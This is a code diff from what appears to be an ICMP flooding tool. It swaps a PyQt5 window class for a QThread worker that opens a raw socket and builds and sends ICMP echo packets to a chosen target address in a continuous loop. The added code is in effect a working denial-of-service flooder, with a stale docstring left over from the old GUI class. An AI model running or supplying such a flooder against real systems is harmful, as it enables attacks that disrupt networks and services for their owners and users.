@@ -1,110 +1,116 @@
-from typing import Dict, Any
+from logging import error, warning
+from struct import pack, error as PackException
+from threading import ThreadError
+from time import time, sleep
+from typing import Any, Dict
 
-from PyQt5 import QtCore
-from PyQt5.QtCore import QThread, QObject
-from PyQt5.QtWidgets import (
-    QLabel,
-    QWidget,
-    QGridLayout,
-    QPushButton
+from socket import (
+    socket,
+    htons,
+    inet_aton,
+    AF_INET,
+    SOCK_RAW,
+    IPPROTO_ICMP
 )
 
-from icmpflood.flooder import Flooder
+from PyQt5.QtCore import QThread
 
 
-class FloodingWindow(QWidget):
+class FloodingWorker(QThread):
     """
     This class extends PyQt5.QtWidgets.QWidget class which provides ability to build
     and show GUI window. This class build window which contains information about
     running flooding process.
     """
 
-    args: Dict[str, Any]
-    """The arguments which user has been entered to flood."""
-
-    parent: QObject
-    """The parent object (default = None)."""
-
-    def __init__(self, args: Dict[str, Any], parent=None):
-        QWidget.__init__(self, parent)
-
-        self.all_threads = list()
-
-        self.address = args.get('ip')
-        self.port = args.get('port')
-        self.length = args.get('length')
-        self.frequency = args.get('frequency')
-        self.num_threads = args.get('threads')
-
-        self.setLayout(self._buildGUI())
-        self.setWindowModality(QtCore.Qt.ApplicationModal)
-
-    def _buildGUI(self) -> QGridLayout:
+    def __init__(self, name: str, arguments: Dict[str, Any]):
         """
-        This method creates, configures and returns QGridLayout object with
-        replaced into GUI elements.
+        The main Flooder constructor.
+
+        Args:
+            name (str): The current thread name.
+            arguments (Dict[str, Any]): The dict with target info.
+
+        """
+
+        QThread.__init__(self)
+
+        self.address = arguments.get('address')
+        self.port_number = arguments.get('port')
+        self.packet_length = arguments.get('length')
+        self.sending_delay = arguments.get('delay')
+
+        self.name = name
+        self.shutdown_flag = False
+
+    def interrupt_worker(self):
+        self.shutdown_flag = True
+
+    def run(self):
+        """
+        This method runs with another thread to create ICMP-packet and send it
+        to specified target ip-address.
+
+        Raise:
+        PackException: throws while invoke pack() method failed.
+        KeyboardInterrupt: throws while user send SIGKILL or SIGINT signal
+            to stop all threads whose sending packets.
+
+        """
+
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
+
+        try:
+            inet_aton(self.address)
+            while not self.shutdown_flag:
+                packet = self._construct_packet()
+                sock.sendto(packet, (self.address, self.port_number))
+                sleep(self.sending_delay)
+
+        except PackException as err:
+            error(msg=f'Failed while trying pack msg: {err}')
+            warning(msg=f'The {self.name} thread has not been interrupted!')
+
+        except ThreadError as err:
+            error(msg=f'Has been interrupted closing event. Closing all available threads: {err}')
+            warning(msg=f'The {self.name} thread has been stopped!')
+
+        except Exception as err:
+            error(msg=f'Unknown runtime error into {self.name} thread!: {err}')
+
+        finally:
+            sock.close()
+            self.terminate()
+
+    def _checksum(self, message) -> int:
+        """
+        This method returns the summary byte length of built ICMP-packet.
+
+        Args:
+        message (bytes): The byte array of ICMP-packet (header + body).
 
         Returns:
-            QGridLayout object.
+        int: The summary byte length.
+
         """
 
-        self.setWindowTitle('Flooding')
+        summary = 0
+        for index in range(0, len(message), 2):
+            w = message[index] + (message[index + 1] << 8)
+            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
+        return htons(~summary & 0xffff)
 
-        labelAddress = QLabel('Sending...', self)
-
-        buttonClose = QPushButton('Close', self)
-        buttonClose.clicked.connect(self.__close__all_threads)
-
-        gridLayout = QGridLayout()
-        gridLayout.setSpacing(1)
-
-        gridLayout.addWidget(labelAddress, 1, 0)
-        gridLayout.addWidget(buttonClose, 2, 0)
-
-        return gridLayout
-
-    def show_window(self) -> None:
+    def _construct_packet(self) -> bytes:
         """
-        This method provides ability to show initialized GUI window
-        from another class which is invoked this method.
+        This method returns bytes of IMCP-packet (header + body).
+
+        Returns:
+        bytes: The summary bytes of ICMP-packet.
+
         """
 
-        self.__sendTo()
-        self.show()
-
-    def __close__all_threads(self) -> None:
-        """
-        This method just terminates all running threads.
-        """
-
-        [self.thread.terminate() for self.thread in self.all_threads]
-        self.close()
-
-    def __sendTo(self) -> None:
-        """
-        There is wrapper method to code simplistic.
-        """
-
-        [self.__build_flooder_thread() for _ in range(0, self.num_threads)]
-
-    def __build_flooder_thread(self) -> None:
-        """
-        This method just run flooding into another thread.
-        """
-
-        self.thread = QThread()
-        self.flooder = Flooder(
-            address=self.address,
-            port_number=self.port,
-            packet_length=self.length,
-            sending_frequency=self.frequency
-        )
-
-        self.flooder.moveToThread(self.thread)
-        self.thread.started.connect(self.flooder.run)
-        self.flooder.finished.connect(self.thread.quit)
-        self.flooder.finish_signal.connect(
-            self.__close__all_threads, QtCore.Qt.QueuedConnection)
-
-        self.all_threads.append(self.thread)
-        self.thread.start()
+        header = pack("bbHHh", 8, 0, 0, 1, 1)
+        data_fmt = (self.packet_length - 50) * 'Q'
+        data = pack("d", time()) + data_fmt.encode('ascii')
+        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
+        return header + data
